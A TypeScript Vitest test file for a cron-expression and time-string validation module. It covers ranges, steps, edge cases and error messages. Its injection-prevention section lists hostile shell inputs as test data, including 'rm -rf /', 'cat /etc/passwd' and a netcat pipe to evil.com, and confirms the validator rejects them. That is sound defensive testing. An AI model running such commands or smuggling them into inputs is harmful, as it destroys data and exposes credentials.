/**
 * CRON Validation Module Tests (do-qol8)
 *
 * Comprehensive tests for the cron-validation module covering:
 * - Valid CRON expression parsing
 * - Invalid CRON rejection
 * - Edge cases (month boundaries, leap year days)
 * - DSL to CRON conversion (validateTimeString)
 * - Error handling and error messages
 *
 * This test file focuses on the pure validation functions exported from
 * cron-validation.ts. These are unit tests that don't require the
 * miniflare runtime.
 *
 * @module do/tests/cron-validation.test
 */

import { describe, it, expect } from 'vitest'
import {
  validateCronExpression,
  validateCronField,
  validateTimeString,
  containsDangerousPatterns,
  CronValidationError,
  CRON_FIELD_RANGES,
} from '../workflow/cron-validation'

// ============================================================================
// VALID CRON EXPRESSION PARSING
// ============================================================================

describe('Valid CRON expression parsing', () => {
  describe('validateCronExpression - standard patterns', () => {
    it('should accept basic cron expressions', () => {
      // Every minute
      expect(() => validateCronExpression('* * * * *')).not.toThrow()

      // Every hour at minute 0
      expect(() => validateCronExpression('0 * * * *')).not.toThrow()

      // Daily at midnight
      expect(() => validateCronExpression('0 0 * * *')).not.toThrow()

      // Weekly on Sunday at midnight
      expect(() => validateCronExpression('0 0 * * 0')).not.toThrow()

      // Monthly on first day
      expect(() => validateCronExpression('0 0 1 * *')).not.toThrow()

      // Yearly on Jan 1st
      expect(() => validateCronExpression('0 0 1 1 *')).not.toThrow()
    })

    it('should accept common scheduling patterns', () => {
      // Monday at 9am
      expect(() => validateCronExpression('0 9 * * 1')).not.toThrow()

      // Weekdays at 8am
      expect(() => validateCronExpression('0 8 * * 1-5')).not.toThrow()

      // Every 15 minutes
      expect(() => validateCronExpression('*/15 * * * *')).not.toThrow()

      // Every hour on the half hour
      expect(() => validateCronExpression('30 * * * *')).not.toThrow()

      // Twice daily (9am and 5pm)
      expect(() => validateCronExpression('0 9,17 * * *')).not.toThrow()

      // First Monday of month at noon (using day-of-month 1-7 and Monday)
      expect(() => validateCronExpression('0 12 1-7 * 1')).not.toThrow()
    })

    it('should accept expressions with ranges', () => {
      // Working hours (9am-5pm)
      expect(() => validateCronExpression('0 9-17 * * *')).not.toThrow()

      // First week of month
      expect(() => validateCronExpression('0 0 1-7 * *')).not.toThrow()

      // First quarter (Jan-Mar)
      expect(() => validateCronExpression('0 0 1 1-3 *')).not.toThrow()

      // Weekdays
      expect(() => validateCronExpression('0 0 * * 1-5')).not.toThrow()

      // Weekend
      expect(() => validateCronExpression('0 0 * * 0,6')).not.toThrow()
    })

    it('should accept expressions with step values', () => {
      // Every 5 minutes
      expect(() => validateCronExpression('*/5 * * * *')).not.toThrow()

      // Every 2 hours
      expect(() => validateCronExpression('0 */2 * * *')).not.toThrow()

      // Every 3 days
      expect(() => validateCronExpression('0 0 */3 * *')).not.toThrow()

      // Every other month
      expect(() => validateCronExpression('0 0 1 */2 *')).not.toThrow()

      // Every 10 minutes during work hours
      expect(() => validateCronExpression('*/10 9-17 * * *')).not.toThrow()
    })

    it('should accept expressions with lists', () => {
      // Multiple specific minutes
      expect(() => validateCronExpression('0,15,30,45 * * * *')).not.toThrow()

      // Multiple specific hours
      expect(() => validateCronExpression('0 6,12,18 * * *')).not.toThrow()

      // Specific days of month
      expect(() => validateCronExpression('0 0 1,15 * *')).not.toThrow()

      // Specific months
      expect(() => validateCronExpression('0 0 1 1,4,7,10 *')).not.toThrow()

      // Multiple weekdays
      expect(() => validateCronExpression('0 0 * * 1,3,5')).not.toThrow()
    })

    it('should accept complex combined patterns', () => {
      // Work hours, every 30 min, weekdays only
      expect(() => validateCronExpression('0,30 9-17 * * 1-5')).not.toThrow()

      // Every 15 minutes during business hours, Mon-Fri
      expect(() => validateCronExpression('*/15 8-18 * * 1-5')).not.toThrow()

      // Specific minutes, specific hours, first week, first quarter, weekdays
      expect(() => validateCronExpression('0,30 9,12,15 1-7 1-3 1-5')).not.toThrow()
    })
  })

  describe('validateCronField - individual field validation', () => {
    it('should accept valid minute values (0-59)', () => {
      expect(() => validateCronField('minute', '0')).not.toThrow()
      expect(() => validateCronField('minute', '30')).not.toThrow()
      expect(() => validateCronField('minute', '59')).not.toThrow()
      expect(() => validateCronField('minute', '*')).not.toThrow()
      expect(() => validateCronField('minute', '*/5')).not.toThrow()
      expect(() => validateCronField('minute', '0-30')).not.toThrow()
      expect(() => validateCronField('minute', '0,15,30,45')).not.toThrow()
    })

    it('should accept valid hour values (0-23)', () => {
      expect(() => validateCronField('hour', '0')).not.toThrow()
      expect(() => validateCronField('hour', '12')).not.toThrow()
      expect(() => validateCronField('hour', '23')).not.toThrow()
      expect(() => validateCronField('hour', '*')).not.toThrow()
      expect(() => validateCronField('hour', '*/2')).not.toThrow()
      expect(() => validateCronField('hour', '9-17')).not.toThrow()
      expect(() => validateCronField('hour', '6,12,18')).not.toThrow()
    })

    it('should accept valid dayOfMonth values (1-31)', () => {
      expect(() => validateCronField('dayOfMonth', '1')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '15')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '31')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '*')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '*/7')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '1-15')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '1,15')).not.toThrow()
    })

    it('should accept valid month values (1-12)', () => {
      expect(() => validateCronField('month', '1')).not.toThrow()
      expect(() => validateCronField('month', '6')).not.toThrow()
      expect(() => validateCronField('month', '12')).not.toThrow()
      expect(() => validateCronField('month', '*')).not.toThrow()
      expect(() => validateCronField('month', '*/3')).not.toThrow()
      expect(() => validateCronField('month', '1-6')).not.toThrow()
      expect(() => validateCronField('month', '3,6,9,12')).not.toThrow()
    })

    it('should accept valid dayOfWeek values (0-7)', () => {
      expect(() => validateCronField('dayOfWeek', '0')).not.toThrow() // Sunday
      expect(() => validateCronField('dayOfWeek', '1')).not.toThrow() // Monday
      expect(() => validateCronField('dayOfWeek', '7')).not.toThrow() // Sunday (alias)
      expect(() => validateCronField('dayOfWeek', '*')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '1-5')).not.toThrow() // Weekdays
      expect(() => validateCronField('dayOfWeek', '0,6')).not.toThrow() // Weekend
    })
  })
})

// ============================================================================
// INVALID CRON REJECTION
// ============================================================================

describe('Invalid CRON rejection', () => {
  describe('validateCronExpression - structural errors', () => {
    it('should reject expressions with wrong number of fields', () => {
      // Too few fields
      expect(() => validateCronExpression('*')).toThrow(CronValidationError)
      expect(() => validateCronExpression('* *')).toThrow(CronValidationError)
      expect(() => validateCronExpression('* * *')).toThrow(CronValidationError)
      expect(() => validateCronExpression('* * * *')).toThrow(CronValidationError)

      // Too many fields
      expect(() => validateCronExpression('* * * * * *')).toThrow(CronValidationError)
      expect(() => validateCronExpression('* * * * * * *')).toThrow(CronValidationError)
    })

    it('should reject empty expressions', () => {
      expect(() => validateCronExpression('')).toThrow(CronValidationError)
      expect(() => validateCronExpression('   ')).toThrow(CronValidationError)
      expect(() => validateCronExpression('\t')).toThrow(CronValidationError)
    })

    it('should reject expressions exceeding max length', () => {
      const longExpression = '0 '.repeat(100) + '* * *'
      expect(() => validateCronExpression(longExpression)).toThrow(CronValidationError)
    })
  })

  describe('validateCronField - out of range values', () => {
    it('should reject minute values outside 0-59', () => {
      expect(() => validateCronField('minute', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '60')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '100')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '999')).toThrow(CronValidationError)
    })

    it('should reject hour values outside 0-23', () => {
      expect(() => validateCronField('hour', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '24')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '25')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '48')).toThrow(CronValidationError)
    })

    it('should reject dayOfMonth values outside 1-31', () => {
      expect(() => validateCronField('dayOfMonth', '0')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '32')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '99')).toThrow(CronValidationError)
    })

    it('should reject month values outside 1-12', () => {
      expect(() => validateCronField('month', '0')).toThrow(CronValidationError)
      expect(() => validateCronField('month', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('month', '13')).toThrow(CronValidationError)
      expect(() => validateCronField('month', '24')).toThrow(CronValidationError)
    })

    it('should reject dayOfWeek values outside 0-7', () => {
      expect(() => validateCronField('dayOfWeek', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfWeek', '8')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfWeek', '9')).toThrow(CronValidationError)
    })
  })

  describe('validateCronField - malformed patterns', () => {
    it('should reject invalid range formats', () => {
      // End before start
      expect(() => validateCronField('minute', '30-10')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '17-9')).toThrow(CronValidationError)

      // Malformed ranges
      expect(() => validateCronField('minute', '-5')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '5-')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '5--10')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '-5-10')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '5-10-15')).toThrow(CronValidationError)

      // Out of range values in ranges
      expect(() => validateCronField('minute', '0-60')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '0-24')).toThrow(CronValidationError)
    })

    it('should reject invalid step formats', () => {
      // Zero step
      expect(() => validateCronField('minute', '*/0')).toThrow(CronValidationError)

      // Negative step
      expect(() => validateCronField('minute', '*/-5')).toThrow(CronValidationError)

      // Step too large
      expect(() => validateCronField('minute', '*/61')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '*/25')).toThrow(CronValidationError)

      // Missing step value
      expect(() => validateCronField('minute', '*/')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '0-30/')).toThrow(CronValidationError)
    })

    it('should reject invalid list formats', () => {
      // Empty list items
      expect(() => validateCronField('minute', '0,,30')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', ',0,30')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '0,30,')).toThrow(CronValidationError)

      // Out of range in list
      expect(() => validateCronField('minute', '0,60,30')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '9,25,12')).toThrow(CronValidationError)
    })

    it('should reject non-numeric values', () => {
      expect(() => validateCronField('minute', 'abc')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', 'noon')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '1a2')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', 'a5')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '5a')).toThrow(CronValidationError)
    })

    it('should reject empty or whitespace-only values', () => {
      expect(() => validateCronField('minute', '')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '   ')).toThrow(CronValidationError)
      expect(() => validateCronField('minute', '\t')).toThrow(CronValidationError)
    })
  })
})

// ============================================================================
// EDGE CASES
// ============================================================================

describe('Edge cases', () => {
  describe('Month boundaries', () => {
    it('should accept day 31 for months that have 31 days', () => {
      // CRON doesn't validate month/day combinations, it just validates ranges
      expect(() => validateCronExpression('0 0 31 * *')).not.toThrow()
      expect(() => validateCronExpression('0 0 31 1 *')).not.toThrow() // January
      expect(() => validateCronExpression('0 0 31 3 *')).not.toThrow() // March
      expect(() => validateCronExpression('0 0 31 5 *')).not.toThrow() // May
      expect(() => validateCronExpression('0 0 31 7 *')).not.toThrow() // July
      expect(() => validateCronExpression('0 0 31 8 *')).not.toThrow() // August
      expect(() => validateCronExpression('0 0 31 10 *')).not.toThrow() // October
      expect(() => validateCronExpression('0 0 31 12 *')).not.toThrow() // December
    })

    it('should accept day 30 for months that have 30 days', () => {
      expect(() => validateCronExpression('0 0 30 4 *')).not.toThrow() // April
      expect(() => validateCronExpression('0 0 30 6 *')).not.toThrow() // June
      expect(() => validateCronExpression('0 0 30 9 *')).not.toThrow() // September
      expect(() => validateCronExpression('0 0 30 11 *')).not.toThrow() // November
    })

    it('should accept day 29 for February (leap year consideration)', () => {
      // CRON accepts day 29 for February - scheduler handles non-existent days
      expect(() => validateCronExpression('0 0 29 2 *')).not.toThrow()
    })

    it('should reject day 32 or higher (always invalid)', () => {
      expect(() => validateCronField('dayOfMonth', '32')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '33')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '40')).toThrow(CronValidationError)
    })

    it('should reject day 0 (always invalid)', () => {
      expect(() => validateCronField('dayOfMonth', '0')).toThrow(CronValidationError)
    })
  })

  describe('Day of week edge cases', () => {
    it('should accept both 0 and 7 for Sunday', () => {
      expect(() => validateCronExpression('0 0 * * 0')).not.toThrow()
      expect(() => validateCronExpression('0 0 * * 7')).not.toThrow()
    })

    it('should accept full week range with Sunday aliases', () => {
      expect(() => validateCronField('dayOfWeek', '0-6')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '1-7')).not.toThrow()
    })

    it('should accept weekend pattern', () => {
      expect(() => validateCronField('dayOfWeek', '0,6')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '6,7')).not.toThrow()
    })
  })

  describe('Boundary values for each field', () => {
    it('should accept minimum values for all fields', () => {
      expect(() => validateCronField('minute', '0')).not.toThrow()
      expect(() => validateCronField('hour', '0')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '1')).not.toThrow()
      expect(() => validateCronField('month', '1')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '0')).not.toThrow()
    })

    it('should accept maximum values for all fields', () => {
      expect(() => validateCronField('minute', '59')).not.toThrow()
      expect(() => validateCronField('hour', '23')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '31')).not.toThrow()
      expect(() => validateCronField('month', '12')).not.toThrow()
      expect(() => validateCronField('dayOfWeek', '7')).not.toThrow()
    })

    it('should reject one-below-minimum values', () => {
      expect(() => validateCronField('minute', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '-1')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '0')).toThrow(CronValidationError)
      expect(() => validateCronField('month', '0')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfWeek', '-1')).toThrow(CronValidationError)
    })

    it('should reject one-above-maximum values', () => {
      expect(() => validateCronField('minute', '60')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '24')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfMonth', '32')).toThrow(CronValidationError)
      expect(() => validateCronField('month', '13')).toThrow(CronValidationError)
      expect(() => validateCronField('dayOfWeek', '8')).toThrow(CronValidationError)
    })
  })

  describe('Step value edge cases', () => {
    it('should accept step value equal to range size', () => {
      // Step of 60 for minutes (range is 0-59, size is 60)
      expect(() => validateCronField('minute', '*/60')).not.toThrow()
      // Step of 24 for hours
      expect(() => validateCronField('hour', '*/24')).not.toThrow()
    })

    it('should reject step value larger than range size', () => {
      expect(() => validateCronField('minute', '*/61')).toThrow(CronValidationError)
      expect(() => validateCronField('hour', '*/25')).toThrow(CronValidationError)
    })

    it('should accept step of 1 (essentially same as wildcard)', () => {
      expect(() => validateCronField('minute', '*/1')).not.toThrow()
      expect(() => validateCronField('hour', '*/1')).not.toThrow()
    })

    it('should accept step with range base', () => {
      expect(() => validateCronField('minute', '0-30/5')).not.toThrow()
      expect(() => validateCronField('hour', '9-17/2')).not.toThrow()
      expect(() => validateCronField('dayOfMonth', '1-15/3')).not.toThrow()
    })
  })

  describe('Whitespace handling', () => {
    it('should handle expressions with multiple spaces between fields', () => {
      expect(() => validateCronExpression('0   9   *   *   1')).not.toThrow()
      expect(() => validateCronExpression('0  9  *  *  1')).not.toThrow()
    })

    it('should handle expressions with leading/trailing spaces', () => {
      expect(() => validateCronExpression('  0 9 * * 1  ')).not.toThrow()
    })

    it('should reject expressions with tab characters (control character)', () => {
      // Tabs are control characters (\x09) and are rejected by dangerous pattern detection
      expect(() => validateCronExpression('\t0 9 * * 1\t')).toThrow(CronValidationError)
    })
  })
})

// ============================================================================
// DSL TO CRON CONVERSION (validateTimeString)
// ============================================================================

describe('DSL to CRON conversion (validateTimeString)', () => {
  describe('12-hour format parsing', () => {
    it('should parse AM times correctly', () => {
      expect(validateTimeString('6am')).toEqual({ hour: 6, minute: 0 })
      expect(validateTimeString('9am')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('11am')).toEqual({ hour: 11, minute: 0 })
    })

    it('should parse PM times correctly', () => {
      expect(validateTimeString('1pm')).toEqual({ hour: 13, minute: 0 })
      expect(validateTimeString('5pm')).toEqual({ hour: 17, minute: 0 })
      expect(validateTimeString('11pm')).toEqual({ hour: 23, minute: 0 })
    })

    it('should handle 12am (midnight) correctly', () => {
      expect(validateTimeString('12am')).toEqual({ hour: 0, minute: 0 })
      expect(validateTimeString('12:00am')).toEqual({ hour: 0, minute: 0 })
    })

    it('should handle 12pm (noon) correctly', () => {
      expect(validateTimeString('12pm')).toEqual({ hour: 12, minute: 0 })
      expect(validateTimeString('12:00pm')).toEqual({ hour: 12, minute: 0 })
    })

    it('should parse times with minutes', () => {
      expect(validateTimeString('9:30am')).toEqual({ hour: 9, minute: 30 })
      expect(validateTimeString('3:45pm')).toEqual({ hour: 15, minute: 45 })
      expect(validateTimeString('12:15pm')).toEqual({ hour: 12, minute: 15 })
      expect(validateTimeString('12:59am')).toEqual({ hour: 0, minute: 59 })
    })

    it('should be case insensitive', () => {
      expect(validateTimeString('9AM')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('5PM')).toEqual({ hour: 17, minute: 0 })
      expect(validateTimeString('9Am')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('9aM')).toEqual({ hour: 9, minute: 0 })
    })
  })

  describe('24-hour format parsing', () => {
    it('should parse 24-hour times correctly', () => {
      expect(validateTimeString('00:00')).toEqual({ hour: 0, minute: 0 })
      expect(validateTimeString('09:00')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('15:30')).toEqual({ hour: 15, minute: 30 })
      expect(validateTimeString('23:59')).toEqual({ hour: 23, minute: 59 })
    })

    it('should parse single-digit hours in 24-hour format', () => {
      expect(validateTimeString('0:00')).toEqual({ hour: 0, minute: 0 })
      expect(validateTimeString('9:00')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('9:30')).toEqual({ hour: 9, minute: 30 })
    })
  })

  describe('Invalid time string rejection', () => {
    it('should reject invalid hour values in 12-hour format', () => {
      expect(() => validateTimeString('0am')).toThrow(CronValidationError)
      expect(() => validateTimeString('13am')).toThrow(CronValidationError)
      expect(() => validateTimeString('13pm')).toThrow(CronValidationError)
    })

    it('should reject invalid hour values in 24-hour format', () => {
      expect(() => validateTimeString('24:00')).toThrow(CronValidationError)
      expect(() => validateTimeString('25:00')).toThrow(CronValidationError)
    })

    it('should reject invalid minute values', () => {
      expect(() => validateTimeString('9:60am')).toThrow(CronValidationError)
      expect(() => validateTimeString('9:99am')).toThrow(CronValidationError)
      expect(() => validateTimeString('15:60')).toThrow(CronValidationError)
    })

    it('should reject malformed time strings', () => {
      expect(() => validateTimeString('am9')).toThrow(CronValidationError)
      expect(() => validateTimeString(':30')).toThrow(CronValidationError)
      expect(() => validateTimeString('9:')).toThrow(CronValidationError)
      expect(() => validateTimeString('nine')).toThrow(CronValidationError)
      expect(() => validateTimeString('9 oclock')).toThrow(CronValidationError)
    })

    it('should reject empty or whitespace-only time strings', () => {
      expect(() => validateTimeString('')).toThrow(CronValidationError)
      expect(() => validateTimeString('   ')).toThrow(CronValidationError)
      expect(() => validateTimeString('\t')).toThrow(CronValidationError)
    })

    it('should reject time strings exceeding max length', () => {
      const longTime = '9am' + 'a'.repeat(100)
      expect(() => validateTimeString(longTime)).toThrow(CronValidationError)
    })
  })

  describe('Whitespace handling in time strings', () => {
    it('should handle leading/trailing whitespace', () => {
      expect(validateTimeString('  9am  ')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('\t5pm\t')).toEqual({ hour: 17, minute: 0 })
    })

    it('should handle space between time and meridiem', () => {
      expect(validateTimeString('9 am')).toEqual({ hour: 9, minute: 0 })
      expect(validateTimeString('5 pm')).toEqual({ hour: 17, minute: 0 })
      expect(validateTimeString('3:30 pm')).toEqual({ hour: 15, minute: 30 })
    })
  })
})

// ============================================================================
// DANGEROUS PATTERN DETECTION
// ============================================================================

describe('Dangerous pattern detection', () => {
  describe('containsDangerousPatterns', () => {
    it('should detect shell metacharacters', () => {
      expect(containsDangerousPatterns('; rm -rf /')).toBe(true)
      expect(containsDangerousPatterns('&& cat /etc/passwd')).toBe(true)
      expect(containsDangerousPatterns('| nc evil.com')).toBe(true)
      expect(containsDangerousPatterns('$(whoami)')).toBe(true)
      expect(containsDangerousPatterns('`id`')).toBe(true)
      expect(containsDangerousPatterns("'test'"  )).toBe(true)
      expect(containsDangerousPatterns('"test"')).toBe(true)
    })

    it('should detect control characters', () => {
      expect(containsDangerousPatterns('\x00')).toBe(true) // Null byte
      expect(containsDangerousPatterns('\x01')).toBe(true) // Control char
      expect(containsDangerousPatterns('\x1f')).toBe(true) // Control char
      expect(containsDangerousPatterns('\x7f')).toBe(true) // DEL
    })

    it('should detect unicode injection characters', () => {
      expect(containsDangerousPatterns('\u200B')).toBe(true) // Zero-width space
      expect(containsDangerousPatterns('\u200F')).toBe(true) // RTL mark
      expect(containsDangerousPatterns('\u202E')).toBe(true) // RTL override
      expect(containsDangerousPatterns('\uFEFF')).toBe(true) // BOM
    })

    it('should detect newlines', () => {
      expect(containsDangerousPatterns('\n')).toBe(true)
      expect(containsDangerousPatterns('\r')).toBe(true)
      expect(containsDangerousPatterns('\r\n')).toBe(true)
    })

    it('should not flag safe CRON characters', () => {
      expect(containsDangerousPatterns('0 9 * * 1')).toBe(false)
      expect(containsDangerousPatterns('*/15')).toBe(false)
      expect(containsDangerousPatterns('0-59')).toBe(false)
      expect(containsDangerousPatterns('0,15,30,45')).toBe(false)
    })
  })

  describe('Full expression injection prevention', () => {
    it('should reject expressions with command injection', () => {
      expect(() => validateCronExpression('0 9 * * * ; rm -rf /')).toThrow()
      expect(() => validateCronExpression('0 9 * * * && cat /etc/passwd')).toThrow()
      expect(() => validateCronExpression('$(whoami) 9 * * *')).toThrow()
      expect(() => validateCronExpression('0 9 * * * | nc evil.com 1234')).toThrow()
    })

    it('should reject time strings with command injection', () => {
      expect(() => validateTimeString('9am; rm -rf /')).toThrow(CronValidationError)
      expect(() => validateTimeString('9am && cat /etc/passwd')).toThrow(CronValidationError)
      expect(() => validateTimeString('$(date)am')).toThrow(CronValidationError)
    })
  })
})

// ============================================================================
// ERROR MESSAGES AND ERROR TYPES
// ============================================================================

describe('Error messages and error types', () => {
  describe('CronValidationError properties', () => {
    it('should include field type in error', () => {
      try {
        validateCronField('minute', '60')
        expect.fail('Should have thrown')
      } catch (e) {
        expect(e).toBeInstanceOf(CronValidationError)
        expect((e as CronValidationError).field).toBe('minute')
        expect((e as CronValidationError).value).toBe('60')
      }
    })

    it('should have descriptive error messages', () => {
      try {
        validateCronField('hour', '25')
        expect.fail('Should have thrown')
      } catch (e) {
        expect(e).toBeInstanceOf(CronValidationError)
        expect((e as CronValidationError).message).toContain('hour')
        expect((e as CronValidationError).message).toContain('25')
      }
    })
  })

  describe('Error message content', () => {
    it('should indicate out of bounds errors', () => {
      try {
        validateCronField('minute', '60')
        expect.fail('Should have thrown')
      } catch (e) {
        expect((e as Error).message).toMatch(/out of bounds|bounds/i)
      }
    })

    it('should indicate invalid range errors', () => {
      try {
        validateCronField('minute', '30-10')
        expect.fail('Should have thrown')
      } catch (e) {
        expect((e as Error).message).toMatch(/range|greater/i)
      }
    })

    it('should indicate field count errors', () => {
      try {
        validateCronExpression('* * * *')
        expect.fail('Should have thrown')
      } catch (e) {
        expect((e as Error).message).toMatch(/5 fields|exactly 5/i)
      }
    })
  })
})

// ============================================================================
// CRON_FIELD_RANGES CONSTANT
// ============================================================================

describe('CRON_FIELD_RANGES constant', () => {
  it('should define correct ranges for all field types', () => {
    expect(CRON_FIELD_RANGES.second).toEqual({ min: 0, max: 59 })
    expect(CRON_FIELD_RANGES.minute).toEqual({ min: 0, max: 59 })
    expect(CRON_FIELD_RANGES.hour).toEqual({ min: 0, max: 23 })
    expect(CRON_FIELD_RANGES.dayOfMonth).toEqual({ min: 1, max: 31 })
    expect(CRON_FIELD_RANGES.month).toEqual({ min: 1, max: 12 })
    expect(CRON_FIELD_RANGES.dayOfWeek).toEqual({ min: 0, max: 7 })
  })
})
